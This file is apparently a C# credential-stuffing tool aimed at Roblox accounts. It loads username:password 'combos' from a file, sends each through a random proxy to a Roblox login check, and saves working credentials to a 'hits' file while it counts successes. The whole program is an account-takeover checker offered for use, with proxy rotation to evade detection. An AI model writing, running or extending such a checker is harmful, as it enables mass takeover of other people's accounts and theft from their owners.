using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Timers;
using httphelper;
using robloxservice;

class Program
{
    private static SemaphoreSlim semaphore = new SemaphoreSlim(10);
    private static Dictionary<DateTime, int> trueCounts = new Dictionary<DateTime, int>();
    private static Dictionary<DateTime, int> falseCounts = new Dictionary<DateTime, int>();
    private static int trueCount = 0;
    private static int falseCount = 0;
    private static System.Timers.Timer updateTimer = new System.Timers.Timer(1000); // Timer to update counts every second

    static async Task Main(string[] args)
    {
        // Start the update timer
        updateTimer.Elapsed += UpdateTimerElapsed;
        updateTimer.AutoReset = true;
        updateTimer.Enabled = true;

        // Read combos from the file asynchronously
        var combos = await ReadCombosFromFile("combos.txt");

        // Process each combo asynchronously
        await ProcessCombos(combos);
    }

    static async Task<List<string>> ReadCombosFromFile(string filePath)
    {
        List<string> combos = new List<string>();

        // Read combos from the file asynchronously
        using (StreamReader reader = new StreamReader(filePath))
        {
            string line;
            while ((line = await reader.ReadLineAsync()) != null)
            {
                combos.Add(line);
            }
        }

        return combos;
    }

    static async Task ProcessCombos(List<string> combos)
    {
        // Process each combo asynchronously
        foreach (var combo in combos)
        {
            await semaphore.WaitAsync(); // Wait until there's less than 50 active threads
            _ = Task.Run(async () =>
            {
                try
                {
                    await CheckAccount(combo);
                }
                finally
                {
                    semaphore.Release(); // Release semaphore after processing
                }
            });
        }
    }

    static async Task CheckAccount(string combo)
    {
        var splitCombo = combo.Split(":");
        if (splitCombo.Length != 2)
        {
            Console.WriteLine($"Invalid combo format: {combo}");
            return;
        }

        string username = splitCombo[0];
        string password = splitCombo[1];

        var clientHelper = new ClientHelper();
        var proxy = await clientHelper.GetRandomProxy();
        var client = await clientHelper.CreateHttpClient(proxy);

        var response = await robloxservice.robloxservice.xsrf(client, combo);

        // Update true or false counts based on response
        if (response)
        {
            using (StreamWriter writer = File.AppendText("data/hits.txt"))
            {
                writer.WriteLine($"{username}:{password}");
            }
            trueCount++;
        }
        else
        {
            falseCount++;
        }
    }

    static void UpdateTimerElapsed(object sender, ElapsedEventArgs e)
    {
        // Update console title with true and false counts
        Console.Title = $"True: {trueCount}, False: {falseCount}";
    }
}